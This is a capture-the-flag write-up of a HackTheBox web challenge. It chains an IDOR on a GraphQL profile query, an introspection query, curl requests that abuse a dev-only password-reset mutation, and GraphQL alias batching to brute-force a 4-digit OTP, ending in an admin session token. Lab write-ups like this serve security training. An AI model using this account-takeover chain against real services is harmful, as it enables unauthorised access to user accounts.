---
title: 'HackTheSystem: SpeedNet'
author: lict
categories: [HackTheBox]
tags: [web, graphql, IDOR, OTP, bruteforce]
render_with_liquid: false
media_subpath: /images/hackthesystem_speednet/
---

The challenge description:
```
Speednet is an Internet Service Provider platform that enables users to purchase internet services. We invite you to participate in our bug bounty program to identify any potential vulnerabilities within the application and retrieve the flag hidden on the site. For your testing, we have provided additional email services. Please find the details below:  
Email Site: `http://IP:PORT/emails/` Email Address: test@email.htb
```

We can make an account here, let's proceed with that. When we visit the `/profile` endpoint, the browser sends the following request to load our data:

![20250629182719.png](20250629182719.png)

Let's change the `userId` parameter to `1` and see if we can get the `admin`'s data:

![[Pasted image 20250629182811.png]]

It worked! I saved the output we got and tried to send the introspection query.
Here's the request body I sent to `/graphql` endpoint:
```
{"query":"{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}"}
```

I noticed this interesting mutation, seems like we can reset the `admin`'s password:

![[Pasted image 20250629183152.png]]

I used the following `curl` command to proceed:
```
┌──(kali㉿kali)-[/tmp/mongo-objectid-predict]
└─$ curl 'http://94.237.62.135:45936/graphql' \
  -X POST \
  -H 'Content-Type: application/json' \
  --data-raw '{"query":"mutation GetAdminResetToken { devForgotPassword(email:   \"admin@speednet.htb\") }"}'
{"data":{"devForgotPassword":"Dev only! Password reset token: 885ba666-3dfd-4175-9fdc-406c2e15dcbc"}}

```

Then, using the token I got I reset the admin's password:
```
┌──(kali㉿kali)-[/tmp/mongo-objectid-predict]
└─$ curl 'http://94.237.62.135:45936/graphql' \
  -X POST \
  -H 'Content-Type: application/json' \
  --data-raw '{"query":"mutation ChangeAdminPassword { resetPassword(token: \"885ba666-3dfd-4175-9fdc-406c2e15dcbc\", newPassword: \"Lictwashere123!\") }"}'
{"data":{"resetPassword":"Password has been reset successfully"}}

```

It worked, I was able to login as admin but it asked for an OTP:

![[Pasted image 20250629183832.png]]

I clicked resend OTP hoping it will be exposed somewhere, but it just exposed a token:

![[Pasted image 20250629184139.png]]

I've decided to `bruteforce` the OTP using `graphql aliases`. I vibe coded a tool again, made small changes, grabbed the token and ran it hoping it will work, and BOOM!

```
┌──(kali㉿kali)-[/tmp/mongo-objectid-predict]
└─$ python3 hack_otp.py

[*] Starting attack for 4-digit OTPs...
[*] Target: http://94.237.62.135:45936/graphql
[*] Batch size: 200

[*] Sending batch: 0000 -> 0199
[*] Sending batch: 0200 -> 0399
[*] Sending batch: 0400 -> 0599
[*] Sending batch: 0600 -> 0799
[*] Sending batch: 0800 -> 0999
[*] Sending batch: 1000 -> 1199
[*] Sending batch: 1200 -> 1399
[*] Sending batch: 1400 -> 1599
[*] Sending batch: 1600 -> 1799
[*] Sending batch: 1800 -> 1999

==================================================
[+] SUCCESS! OTP FOUND: 1814
==================================================

[+] Full Response from Server:
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTc1MTIwODI4NSwiZXhwIjoxNzUxMjExODg1fQ.mWEpTT-kDCqiBjj8uKk1h4kASKQDcwlJHP6uQGGSfyQ",
  "user": {
    "id": 1,
    "email": "admin@speednet.htb"
  }
}

[+] FINAL SESSION TOKEN:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTc1MTIwODI4NSwiZXhwIjoxNzUxMjExODg1fQ.mWEpTT-kDCqiBjj8uKk1h4kASKQDcwlJHP6uQGGSfyQ

```

I signed into my own account and switched tokens in `Local Storage` from mine to the hacked one. I refreshed the page using `CTRL+SHIFT+R` and noticed that I am logged in as `admin@speednet.htb`. I just navigated to the `Billing` tab, scrolled the page down and grabbed the flag!

![[Pasted image 20250629184844.png]]
